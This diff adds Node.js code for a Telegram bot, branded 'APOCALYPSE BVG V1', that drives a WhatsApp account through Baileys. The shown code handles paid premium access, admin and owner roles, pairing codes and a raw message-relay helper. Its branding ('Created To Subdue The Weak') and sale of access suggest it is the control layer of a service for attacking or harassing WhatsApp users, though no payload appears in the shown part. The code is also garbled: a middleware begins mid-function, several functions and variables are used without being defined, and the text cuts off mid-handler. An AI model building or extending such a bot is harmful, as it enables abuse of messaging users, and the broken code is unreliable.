@@ -1,0 +1,3546 @@
+const { Telegraf, Markup } = require("telegraf");
+const fs = require('fs');
+const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    DisconnectReason,
+    fetchLatestBaileysVersion,
+} = require('@whiskeysockets/baileys');
+const pino = require('pino');
+const chalk = require('chalk');
+const axios = require('axios');
+const moment = require('moment-timezone');
+const { BOT_TOKEN, allowedDevelopers } = require("./config");
+const commandLoader = require('./commandLoader');
+const crypto = require('crypto');
+
+// --- Inisialisasi Bot Telegram ---
+const bot = new Telegraf(BOT_TOKEN);
+
+// --- Variabel Global ---
+let zephy = null;
+let isWhatsAppConnected = false;
+let maintenanceConfig = {
+    maintenance_mode: false,
+    message: "THE WEAK SHALL SUFFER!!"
+};
+let premiumUsers = {};
+let adminList = [];
+let ownerList = [];
+let deviceList = [];
+let userActivity = {};
+let allowedBotTokens = [];
+const COMMAND_PREFIX = '.'; // Command prefix
+const cooldowns = new Map(); // Cooldown management
+// ==================== UTILITY FUNCTIONS ====================
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+// Check if user is Owner
+const isOwner = (userId) => {
+    return ownerList.includes(userId.toString());
+};
+
+// Check if user is Developer
+const isDeveloper = (userId) => {
+    return allowedDevelopers.includes(userId.toString());
+};
+
+// Check if user is Admin
+const isAdmin = (userId) => {
+    return adminList.includes(userId.toString());
+};
+
+// Add Admin
+const addAdmin = (userId) => {
+    if (!adminList.includes(userId)) {
+        adminList.push(userId);
+        saveAdmins();
+    }
+};
+
+// Remove Admin
+const removeAdmin = (userId) => {
+    adminList = adminList.filter(id => id !== userId);
+    saveAdmins();
+};
+
+// Save Admins to file
+const saveAdmins = () => {
+    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
+};
+
+// Load Admins from file
+const loadAdmins = () => {
+    try {
+        const data = fs.readFileSync('./admins.json');
+        adminList = JSON.parse(data);
+    } catch (error) {
+        console.error(chalk.red('Failed to load admin list:'), error);
+        adminList = [];
+    }
+};
+
+// Add Premium User
+const addPremiumUser = (userId, durationDays) => {
+    userId = userId.toString();
+    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
+    premiumUsers[userId] = {
+        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
+    };
+    savePremiumUsers();
+};
+
+// Remove Premium User
+const removePremiumUser = (userId) => {
+    delete premiumUsers[userId];
+    savePremiumUsers();
+};
+
+// Check Premium Status
+const isPremiumUser = (userId) => {
+    const userData = premiumUsers[userId];
+    if (!userData) return false;
+
+    const now = moment().tz('Asia/Jakarta');
+    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');
+    return now.isBefore(expirationDate);
+};
+
+// Save Premium Users
+const savePremiumUsers = () => {
+    fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
+};
+
+// Load Premium Users
+const loadPremiumUsers = () => {
+    try {
+        const data = fs.readFileSync('./premiumUsers.json');
+        premiumUsers = JSON.parse(data);
+    } catch (error) {
+        console.error(chalk.red('Failed to load premium user data:'), error);
+        premiumUsers = {};
+    }
+};
+
+// Load Device List
+const loadDeviceList = () => {
+    try {
+        const data = fs.readFileSync('./ListDevice.json');
+        deviceList = JSON.parse(data);
+    } catch (error) {
+        console.error(chalk.red('Failed to load device list:'), error);
+        deviceList = [];
+    }
+};
+
+// Save Device List
+const saveDeviceList = () => {
+    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
+};
+
+// Record User Activity
+const recordUserActivity = (userId, userNickname) => {
+    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
+    userActivity[userId] = {
+        nickname: userNickname,
+        last_seen: now
+    };
+    fs.writeFileSync('./userActivity.json', JSON.stringify(userActivity));
+};
+
+// Load User Activity
+const loadUserActivity = () => {
+    try {
+        const data = fs.readFileSync('./userActivity.json');
+        userActivity = JSON.parse(data);
+    } catch (error) {
+        console.error(chalk.red('Failed to load user activity:'), error);
+        userActivity = {};
+    }
+};
+
+// ==================== INITIALIZE DATA ====================
+console.log(chalk.cyan('Loading bot data...'));
+loadAdmins();
+loadPremiumUsers();
+loadDeviceList();
+loadUserActivity();
+console.log(chalk.green('✓ Data loaded successfully'));
+
+// ==================== LOAD COMMANDS ====================
+console.log(chalk.blue('\n📦 Loading command plugins...'));
+commandLoader.loadAll();
+console.log(chalk.green(`✓ Total commands available: ${commandLoader.getAllCommandNames().length}\n`));
+
+        // Jika mode maintenance aktif DAN user bukan developer:
+        // Kirim pesan maintenance dan hentikan eksekusi middleware
+        console.log("Pesan Maintenance:", maintenanceConfig.message);
+        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
+        return await ctx.replyWithMarkdown(escapedMessage);
+    } else {
+        // Jika mode maintenance tidak aktif ATAU user adalah developer:
+        // Lanjutkan ke middleware/handler selanjutnya
+        await next();
+    }
+};
+
+// --- Middleware untuk Mengecek Status Premium ---
+const checkPremium = async (ctx, next) => {
+    if (isPremiumUser(ctx.from.id)) {
+        await next();
+    } else {
+        await ctx.reply("❌ Access Denied, you are not a Premium User, contact @haunteddevv for premium access.");
+    }
+};
+
+// --- Relay helper for Baileys participant options ---
+const ensureParticipantCount = (options = {}) => {
+    if (options.participant && options.participant.jid && typeof options.participant.count === 'undefined') {
+        options.participant.count = 1;
+    }
+    return options;
+};
+
+const safeRelayMessage = async (sock, jid, message, options = {}) => {
+    const normalizedOptions = ensureParticipantCount({ ...options });
+    try {
+        return await sock.relayMessage(jid, message, normalizedOptions);
+    } catch (error) {
+        console.error(chalk.red.bold('[!] relayMessage error:'), error);
+        throw error;
+    }
+};
+
+// --- Koneksi WhatsApp ---
+// const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
+
+const startSesi = async () => {
+  const { state, saveCreds } = await useMultiFileAuthState('./session');
+  const { version } = await fetchLatestBaileysVersion();
+
+  const connectionOptions = {
+      version,
+      keepAliveIntervalMs: 30000,
+      printQRInTerminal: false,
+      logger: pino({ level: "silent" }), 
+      auth: state,
+      browser: ['Mac OS', 'Safari', '10.15.7'],
+      getMessage: async (key) => ({
+          conversation: 'P', 
+      }),
+  };
+
+  zephy = makeWASocket(connectionOptions);
+
+  zephy.ev.on('creds.update', saveCreds);
+  // store.bind(zephy.ev);
+
+  zephy.ev.on('connection.update', async (update) => {
+    const { connection, lastDisconnect } = update;
+    const MAX_RECONNECT_ATTEMPTS = 3;
+ 
+    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+ 
+    if (connection === 'open') {
+        isWhatsAppConnected = true;
+        reconnectAttempts = 0;
+        console.log(chalk.white.bold(`
+╭─────────────────
+┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
+╰─────────────────`));
+    }
+ 
+    if (connection === 'close') {
+        isWhatsAppConnected = false;
+        
+        // Cek jika terdeteksi logout
+        if (lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut) {
+            console.log(chalk.red.bold(`
+╭─────────────────
+┃   🚫 WHATSAPP LOGGED OUT
+╰─────────────────`));
+ 
+            // Kirim notifikasi ke owner
+            for (const ownerId of allowedDevelopers) {
+                if (!ownerId || isNaN(ownerId) || ownerId.length < 5) {
+                    console.log(chalk.yellow(`Skipping notification to invalid owner ID: ${ownerId}`));
+                    continue;
+                }
+                try {
+                    await bot.telegram.sendMessage(ownerId, `
+╭═══[ 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗟𝗢𝗚𝗢𝗨𝗧 ]═══⊱
+┃
+┃ • Status: SESSION LOGGED OUT 
+┃ • Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YY HH:mm:ss')} WIB
+┃
+┃ ☄️ seems your whatsapp couldn't Survive the apocalypse.. Try Reviving (Pairing)
+╰═════════════════⊱`, {
+                        parse_mode: "Markdown",
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: "❌ Close", callback_data: "close" }]
+                            ]
+                        }
+                    });
+                } catch (notifError) {
+                    console.error(chalk.red.bold(`Gagal mengirim notifikasi ke owner ${ownerId}:`, notifError));
+                }
+            }
+ 
+            // Hapus file session - DISABLED to prevent issues
+            /*
+            const sessionPath = './session';
+            try {
+                fs.rmSync(sessionPath, { recursive: true, force: true });
+                console.log(chalk.yellow.bold(`
+╭─────────────────
+┃   ✅ All File Berhasil Di Delete
+┃   Lakukan Pairing Ulang...
+╰─────────────────`));
+            } catch (error) {
+                console.error(chalk.red.bold(`
+╭─────────────────
+┃   ❌ Gagal menghapus file session
+┃   Error: ${error.message}
+╰─────────────────`));
+            }
+            */
+ 
+            console.log(chalk.yellow.bold(`
+╭─────────────────
+┃   🔄 Session logged out, attempting to reconnect without deleting files...
+╰─────────────────`));
+ 
+            zephy = null;
+            reconnectAttempts = 0;
+            return; // Stop reconnection attempts
+        }
+ 
+        // Handle reconnection for non-logout disconnects
+        if (shouldReconnect) {
+            reconnectAttempts++;
+ 
+            console.log(
+                chalk.white.bold(`
+╭─────────────────
+┃   ${chalk.red.bold('WHATSAPP DISCONNECTED')}
+┃   Percobaan Reconnect: ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS}
+╰─────────────────`)
+            );
+ 
+            if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
+                console.log(chalk.red.bold(`
+╭─────────────────
+┃   🚫 WHATSAPP NUMBER HAS BEEN BANNED 🚫
+┃   Delete file session...
+╰─────────────────`));
+ 
+                // Kirim notifikasi ke owner
+                for (const ownerId of allowedDevelopers) {
+                    try {
+                        await bot.telegram.sendMessage(ownerId, `
+╭═══[ 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗕𝗔𝗡𝗡𝗘𝗗 ]═══⊱
+┃
+┃ • Status: Terdeteksi Banned
+┃ • Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YY HH:mm:ss')} WIB
+┃ • Percobaan: ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS}
+┃
+┃ 🔄 Sistem telah menghapus sesi
+┃    dan memerlukan pairing ulang
+╰═════════════════⊱`, {
+                            parse_mode: "Markdown",
+                            reply_markup: {
+                                inline_keyboard: [
+                                    [{ text: "❌ Close", callback_data: "close" }]
+                                ]
+                            }
+                        });
+                    } catch (notifError) {
+                        console.error(chalk.red.bold(`Gagal mengirim notifikasi ke owner ${ownerId}:`, notifError));
+                    }
+                }
+ 
+                // Hapus file session - DISABLED
+                /*
+                const sessionPath = './session';
+                try {
+                    fs.rmSync(sessionPath, { recursive: true, force: true });
+                    console.log(chalk.yellow.bold(`
+╭─────────────────
+┃   ✅ All File Berhasil Di Delete
+┃   Lakukan Pairing Ulang...
+╰─────────────────`));
+                } catch (error) {
+                    console.error(chalk.red.bold(`
+╭─────────────────
+┃   ❌ Gagal menghapus file session
+┃   Error: ${error.message}
+╰─────────────────`));
+                }
+                */
+
+                console.log(chalk.yellow.bold(`
+╭─────────────────
+┃   🔄 Session issue detected, attempting to reconnect without deleting files...
+╰─────────────────`));
+ 
+                isWhatsAppConnected = false;
+                zephy = null;
+                reconnectAttempts = 0;
+            } else {
+                setTimeout(() => {
+                    startSesi();
+                }, 5000);
+            }
+        } else {
+            console.log(
+                chalk.white.bold(`
+╭─────────────────
+┃   ${chalk.red.bold('WHATSAPP LOGGED OUT')}
+╰─────────────────`)
+            );
+            
+            // Hapus session ketika logout - DISABLED
+            /*
+            const sessionPath = './session';
+            try {
+                fs.rmSync(sessionPath, { recursive: true, force: true });
+                console.log(chalk.yellow.bold(`
+╭─────────────────
+┃✅ All File Berhasil Di Delete
+┃   Lakukan Pairing Ulang...
+╰─────────────────`));
+            } catch (error) {
+                console.error(chalk.red.bold(`
+╭─────────────────
+┃   ❌ Gagal menghapus file session
+┃   Error: ${error.message}
+╰─────────────────`));
+            }
+            */
+
+            console.log(chalk.yellow.bold(`
+╭─────────────────
+┃   🔄 Logged out, attempting to reconnect without deleting files...
+╰─────────────────`));
+            
+            isWhatsAppConnected = false;
+            zephy = null;
+            reconnectAttempts = 0;
+        }
+    }
+  });
+}
+
+(async () => {
+  console.log(chalk.red.bold(`
+  
+███    ██ ██    ██ ███████  █████  ███    ██ ████████  █████  ██████   █████  
+████   ██ ██    ██ ██      ██   ██ ████   ██    ██    ██   ██ ██   ██ ██   ██ 
+██ ██  ██ ██    ██ ███████ ███████ ██ ██  ██    ██    ███████ ██████  ███████ 
+██  ██ ██ ██    ██      ██ ██   ██ ██  ██ ██    ██    ██   ██ ██   ██ ██   ██ 
+██   ████  ██████  ███████ ██   ██ ██   ████    ██    ██   ██ ██   ██ ██   ██`));
+
+  // Validasi BOT_TOKEN
+  if (!BOT_TOKEN || BOT_TOKEN === '' || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+      console.log(chalk.red.bold(`
+╭═══════════════════════════════════════╮
+┃             ⚠️ ERROR ⚠️               ┃
+┃                                       ┃
+┃ YOU HAVE ENTERED AN INVALID TOKEN             ┃
+┃                                       ┃
+┃ GET A VALID TOKEN FROM TELEGRAM @BotFather           ┃
+┃                                       ┃
+┃ Format: 123456:ABC-DEF1234ghIkl2     ┃
+╰═══════════════════════════════════════╯`));
+      process.exit(1); // Hentikan program jika token tidak valid
+  }
+
+  console.log(chalk.white.bold(`
+╭════════════════════════════════════════════════╮
+┃    ${chalk.red.bold('APOCALYPSE BVG V1')}              ┃
+┃    ${chalk.yellow.bold('Created To Subdue The Weak. @haunteddevv')}┃
+┃    ${chalk.blue.bold('The weak shall Suffer🕷️ ')} ┃
+╰════════════════════════════════════════════════╯`));
+
+  console.log(chalk.white.bold(`
+╭═══════════════════════════════════════╮
+┃ ${chalk.greenBright.bold('SYSTEM PROTECTION')}                     ┃
+┃ ${chalk.yellow.bold('• Anti Crash')}     : ${chalk.green.bold('Active ✓')}      ┃
+┃ ${chalk.yellow.bold('• Anti Spam')}      : ${chalk.green.bold('Active ✓')}      ┃
+┃ ${chalk.yellow.bold('• Limit Handler')}  : ${chalk.green.bold('Active ✓')}      ┃
+╰═══════════════════════════════════════╯`));
+
+  console.log(chalk.white.bold(`
+╭═══════════════════════════════════════╮
+┃ ${chalk.cyanBright.bold('LOADING DATABASE...')}                    ┃
+╰═══════════════════════════════════════╯`));
+
+  try {
+      loadPremiumUsers();
+      loadAdmins();
+      loadDeviceList();
+      loadUserActivity();
+      
+      startSesi();
+
+      // Menambahkan device ke ListDevice.json saat inisialisasi
+      addDeviceToList(BOT_TOKEN, BOT_TOKEN);
+      
+      console.log(chalk.white.bold(`
+╭═══════════════════════════════════════╮
+┃ ${chalk.greenBright.bold('SYSTEM READY!')}                         ┃
+┃ ${chalk.yellow.bold('Bot is now operational and ready to use')}   ┃
+╰═══════════════════════════════════════╯`));
+  } catch (error) {
+      console.error(chalk.red.bold(`
+╭═══════════════════════════════════════╮
+┃             ⚠️ ERROR ⚠️               ┃
+┃                                       ┃
+┃ Terjadi kesalahan saat inisialisasi:  ┃
+┃ ${error.message}
+╰═══════════════════════════════════════╯`));
+      process.exit(1);
+  }
+})();
+// --- Command Handler ---
+
+// Command untuk pairing WhatsApp
+// Command handler untuk addpairing
+bot.command("addpairing", async (ctx) => {
+  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
+      return await ctx.reply("❌ Sorry, you don't have access to use this command.");
+  }
+
+  // Cek jika WhatsApp sudah terhubung
+  if (zephy && zephy.user) {
+      const connectedMessage = `
+┏━━━━[ 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗦𝗧𝗔𝗧𝗨𝗦 ]━━━━
+┃
+┃ ✅ WhatsApp sudah terhubung!
+┃
+┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗣𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁:
+┃ • 𝗡𝗮𝗺𝗲: ${zephy.user.name || 'Tidak diketahui'}
+┃ • 𝗡𝘂𝗺𝗯𝗲𝗿: ${zephy.user.id.split(':')[0]}
+┃ • 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺: ${zephy.user.platform || 'WhatsApp'}
+┗━━━━━━━━━━━━━━━━━━━━`;
+      
+      return await ctx.reply(connectedMessage, {
+          parse_mode: "Markdown",
+          reply_markup: {
+              inline_keyboard: [
+                  [{ text: "❌ Close", callback_data: "close" }]
+              ]
+          }
+      });
+  }
+
+  const args = ctx.message.text.split(" ");
+  if (args.length < 2) {
+      return await ctx.reply("❌ Invalid Command . Use /addpairing <whatsapp_number>");
+  }
+
+  let phoneNumber = args[1];
+  // Hapus semua karakter non-digit
+  phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
+
+  // Validasi panjang nomor minimal
+  if (phoneNumber.length < 8) {
+      return await ctx.reply("❌ Invalid whatsapp Number. Minimum 8 digits.");
+  }
+
+  // Fungsi untuk mengecek dan menambahkan prefix negara
+  const addCountryCode = (number) => {
+      // Jika nomor sudah memiliki kode negara, biarkan apa adanya
+      if (number.match(/^(1|7|20|27|30|31|32|33|34|36|39|40|41|43|44|45|46|47|48|49|51|52|53|54|55|56|57|58|60|61|62|63|64|65|66|81|82|84|86|90|91|92|93|94|95|98|212|213|216|218|220|221|222|223|224|225|226|227|228|229|230|231|232|233|234|235|236|237|238|239|240|241|242|243|244|245|246|247|248|249|250|251|252|253|254|255|256|257|258|260|261|262|263|264|265|266|267|268|269|290|291|297|298|299|350|351|352|353|354|355|356|357|358|359|370|371|372|373|374|375|376|377|378|379|380|381|382|383|385|386|387|389|420|421|423|500|501|502|503|504|505|506|507|508|509|590|591|592|593|594|595|596|597|598|599|670|672|673|674|675|676|677|678|679|680|681|682|683|685|686|687|688|689|690|691|692|850|852|853|855|856|872|880|886|960|961|962|963|964|965|966|967|968|970|971|972|973|974|975|976|977|992|993|994|995|996|998)/)) {
+        return number;
+    }
+      // Jika tidak ada kode negara, tambahkan 62 (Indonesia)
+      return '62' + number;
+  };
+
+  phoneNumber = addCountryCode(phoneNumber);
+
+  // Tambahkan pengecekan eksplisit untuk zephy
+  if (!zephy) {
+      try {
+          await startSesi();
+          await new Promise(resolve => setTimeout(resolve, 5000));
+      } catch (initError) {
+          console.error('Failed to initialize WhatsApp:', initError);
+          return await ctx.reply("❌ Failed to initialize WhatsApp connection. Please try again.");
+      }
+  }
+
+  if (!zephy || !zephy.requestPairingCode) {
+      return await ctx.reply("❌ Koneksi WhatsApp belum siap. Silakan coba lagi dalam beberapa saat.");
+  }
+
+  try {
+      const code = await zephy.requestPairingCode(phoneNumber);
+      const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
+
+      await ctx.replyWithPhoto("https://cdn.anomaki.web.id/file/1739523183904.jpeg", {
+          caption: `┏━━━━[ 𝗣𝗔𝗜𝗥𝗜𝗡𝗚 𝗖𝗢𝗗𝗘 ]━━━━
+┃
+┃ 𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
+┃ 𝗞𝗼𝗱𝗲: \`${formattedCode}\`
+┗━━━━━━━━━━━━━━━━━━━━`,
+          parse_mode: "Markdown",
+          reply_markup: {
+              inline_keyboard: [
+                  [{ text: "❌ Close", callback_data: "close" }]
+              ]
+          }
+      });
+  } catch (error) {
+      console.error(chalk.red('Failed to perform pairing:'), error);
+      await ctx.reply("❌ Failed to perform pairing. Make sure WhatsApp is connected and the number is valid.");
+  }
+});
+
+// Handler untuk gencode callback query
+bot.action(/gencode_(.+)/, async (ctx) => {
+  try {
+      const phoneNumber = ctx.match[1];
+      
+      // Tampilkan status loading (gunakan callback.answer sebagai gantinya)
+      await ctx.callback.answer("Generating new code..."); 
+      
+      if (zephy && zephy.user) {
+          return await ctx.editMessageCaption("ℹ️ WhatsApp sudah terhubung. Tidak perlu pairing lagi.", {
+              reply_markup: {
+                  inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]]
+              }
+          });
+      }
+
+      const code = await zephy.requestPairingCode(phoneNumber);
+      const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
+
+      await ctx.editMessageCaption(
+          `┏━━━━[ 𝗣𝗔𝗜𝗥𝗜𝗡𝗚 𝗖𝗢𝗗𝗘 ]━━━━
+┃
+┃ 𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
+┃ 𝗞𝗼𝗱𝗲: \`${formattedCode}\`
+┗━━━━━━━━━━━━━━━━━━━━`, {
+          parse_mode: "Markdown",
+          reply_markup: {
+              inline_keyboard: [
+                  [{ text: "🔄 Generate New Code", callback_data: `gencode_${phoneNumber}` }],
+                  [{ text: "❌ Close", callback_data: "close" }]
+              ]
+          }
+      });
+
+  } catch (error) {
+      console.error('Error generating new code:', error);
+      // Gunakan callback.answer untuk error juga
+      await ctx.callback.answer("❌ Gagal generate kode baru. Silakan coba lagi."); 
+  }
+});
+
+// Handler untuk tombol close
+bot.action("close", async (ctx) => {
+  try {
+      await ctx.deleteMessage();
+  } catch (error) {
+      console.error(chalk.red('Gagal menghapus pesan:'), error);
+  }
+});
+
+// Command /addowner - Menambahkan owner baru
+bot.command("addowner", async (ctx) => {
+  if (!OWNER_ID(ctx.from.id)) {
+      return await ctx.reply("❌ Sorry, you don't have access to use this command, buy acces @haunteddevv.");
+  }
+
+  let userId;
+  
+  // Cek jika command merupakan reply ke pesan
+  if (ctx.message.reply_to_message) {
+      userId = ctx.message.reply_to_message.from.id.toString();
+  } 
+  // Cek jika ada username/mention atau ID yang diberikan
+  else {
+      const args = ctx.message.text.split(" ")[1];
+      
+      if (!args) {
+          return await ctx.reply(`❌ Format salah! Gunakan:
+• Reply pesan: /addowner
+• Username: /addowner @username
+• ID: /addowner 123456789`);
+      }
+
+      // Jika input adalah username (dimulai dengan @)
+      if (args.startsWith("@")) {
+          try {
+              const username = args.slice(1); // Hapus @ dari username
+              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
+              userId = chatMember.user.id.toString();
+          } catch (error) {
+              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
+          }
+      } 
+      // Jika input adalah ID langsung
+      else {
+          if (!/^\d+$/.test(args)) {
+              return await ctx.reply("❌ ID harus berupa angka!");
+          }
+          userId = args;
+      }
+  }
+
+  // Cek apakah user sudah terdaftar sebagai owner
+  if (ownerList.includes(userId)) {
+      return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
+  }
+
+  try {
+      // Dapatkan info user untuk ditampilkan
+      const user = await ctx.telegram.getChat(userId);
+      ownerList.push(userId);
+      await saveOwnerList();
+
+      const successMessage = `
+┏━━━━[ 𝗔𝗗𝗗 𝗢𝗪𝗡𝗘𝗥 ]━━━━
+┃
+┃ ✅ Berhasil menambahkan Owner baru! 
+┃
+┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗢𝘄𝗻𝗲𝗿:
+┃ • ID: ${userId}
+┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
+┃ • Nama: ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}
+┃
+┃ 𝗔𝗸𝘀𝗲𝘀:
+┃ • /addadmin - Tambah Admin
+┃ • /addprem - Tambah Premium
+┃ • /delprem - Hapus Premium
+┗━━━━━━━━━━━━━━━━━━━━`;
+
+      await ctx.replyWithMarkdown(successMessage, {
+          reply_markup: {
+              inline_keyboard: [
+                  [{ text: "📋 List Owner", callback_data: "listowner" }],
+                  [{ text: "❌ Close", callback_data: "close" }]
+              ]
+          }
+      });
+
+  } catch (error) {
+      console.error('Error adding owner:', error);
+      await ctx.reply("❌ Gagal menambahkan owner. Pastikan ID/Username valid dan bot memiliki akses yang diperlukan.");
+  }
+});
+
+// Command /addadmin - Menambahkan admin baru
+bot.command("addadmin", async (ctx) => {
+  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
+      return await ctx.reply("❌ Sorry, you don't have access to use this command.");
+  }
+
+  let userId;
+  
+  // Cek jika command merupakan reply ke pesan
+  if (ctx.message.reply_to_message) {
+      userId = ctx.message.reply_to_message.from.id.toString();
+  } 
+  // Cek jika ada username/mention atau ID yang diberikan
+  else {
+      const args = ctx.message.text.split(" ")[1];
+      
+      if (!args) {
+          return await ctx.reply(`❌ Format salah! Gunakan:
+• Reply pesan: /addadmin
+• Username: /addadmin @username
+• ID: /addadmin 123456789`);
+      }
+
+      // Jika input adalah username (dimulai dengan @)
+      if (args.startsWith("@")) {
+          try {
+              const username = args.slice(1); // Hapus @ dari username
+              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
+              userId = chatMember.user.id.toString();
+          } catch (error) {
+              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
+          }
+      } 
+      // Jika input adalah ID langsung
+      else {
+          if (!/^\d+$/.test(args)) {
+              return await ctx.reply("❌ ID harus berupa angka!");
+          }
+          userId = args;
+      }
+  }
+
+  // Cek apakah user sudah terdaftar sebagai admin
+  if (adminList.includes(userId)) {
+      return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai admin.`);
+  }
+
+  try {
+      // Dapatkan info user untuk ditampilkan
+      const user = await ctx.telegram.getChat(userId);
+      addAdmin(userId);
+
+      const successMessage = `
+┏━━━━[ 𝗔𝗗𝗗 𝗔𝗗𝗠𝗜𝗡 ]━━━━
+┃
+┃ ✅ Berhasil menambahkan Admin baru!
+┃
+┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗔𝗱𝗺𝗶𝗻:
+┃ • ID: ${userId}
+┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
+┃ • Nama: ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}
+┃
+┃ 𝗔𝗸𝘀𝗲𝘀 𝗞𝗼𝗺𝗮𝗻𝗱𝗼:
+┃ • /addprem - Tambah Premium
+┃ • /delprem - Hapus Premium
+┗━━━━━━━━━━━━━━━━━━━━`;
+
+      await ctx.replyWithMarkdown(successMessage, {
+          reply_markup: {
+              inline_keyboard: [
+                  [{ text: "📋 List Admin", callback_data: "listadmin" }],
+                  [{ text: "❌ Close", callback_data: "close" }]
+              ]
+          }
+      });
+
+  } catch (error) {
+      console.error('Error adding admin:', error);
+      await ctx.reply("❌ Gagal menambahkan admin. Pastikan ID/Username valid dan bot memiliki akses yang diperlukan.");
+  }
+});
+
+// Delete Premium Command
+bot.command("delprem", async (ctx) => {
+  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
+      return await ctx.reply("❌ Sorry, you don't have access to use this command.");
+  }
+
+  let userId;
+
+  // Cek jika command merupakan reply ke pesan
+  if (ctx.message.reply_to_message) {
+      userId = ctx.message.reply_to_message.from.id.toString();
+  } else {
+      const args = ctx.message.text.split(" ")[1];
+      if (!args) {
+          return await ctx.reply(`❌ Format salah! Gunakan:
+• Reply pesan: /delprem
+• Username: /delprem @username
+• ID: /delprem 123456789`);
+      }
+
+      // Jika input adalah username
+      if (args.startsWith("@")) {
+          try {
+              const username = args.slice(1);
+              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
+              userId = chatMember.user.id.toString();
+          } catch (error) {
+              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
+          }
+      } else {
+          if (!/^\d+$/.test(args)) {
+              return await ctx.reply("❌ ID harus berupa angka!");
+          }
+          userId = args;
+      }
+  }
+
+  // Cek apakah user adalah premium
+  if (!premiumUsers[userId]) {
+      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
+  }
+
+  try {
+      const user = await ctx.telegram.getChat(userId);
+      removePremiumUser(userId);
+
+      const successMessage = `
+┏━━━━[ 𝗗𝗘𝗟𝗘𝗧𝗘 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 ]━━━━
+┃
+┃ ✅ Berhasil menghapus Premium!
+┃
+┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
+┃ • ID: ${userId}
+┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
+┃ • Nama: ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}
+┃
+┃ User tersebut tidak lagi memiliki
+┃ akses ke fitur premium.
+┗━━━━━━━━━━━━━━━━━━━━`;
+
+      await ctx.replyWithMarkdown(successMessage, {
+          reply_markup: {
+              inline_keyboard: [
+                  [{ text: "📋 List Premium", callback_data: "listprem" }],
+                  [{ text: "❌ Close", callback_data: "close" }]
+              ]
+          }
+      });
+  } catch (error) {
+      console.error('Error removing premium:', error);
+      await ctx.reply("❌ Gagal menghapus premium. Pastikan ID/Username valid.");
+  }
+});
+
+// Delete Admin Command
+bot.command("deladmin", async (ctx) => {
+  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
+      return await ctx.reply("❌ Sorry, you don't have access to use this command.");
+  }
+
+  let userId;
+
+  if (ctx.message.reply_to_message) {
+      userId = ctx.message.reply_to_message.from.id.toString();
+  } else {
+      const args = ctx.message.text.split(" ")[1];
+      if (!args) {
+          return await ctx.reply(`❌ Format salah! Gunakan:
+• Reply pesan: /deladmin
+• Username: /deladmin @username
+• ID: /deladmin 123456789`);
+      }
+
+      if (args.startsWith("@")) {
+          try {
+              const username = args.slice(1);
+              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
+              userId = chatMember.user.id.toString();
+          } catch (error) {
+              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
+          }
+      } else {
+          if (!/^\d+$/.test(args)) {
+              return await ctx.reply("❌ ID harus berupa angka!");
+          }
+          userId = args;
+      }
+  }
+
+  if (!adminList.includes(userId)) {
+      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai admin.`);
+  }
+
+  try {
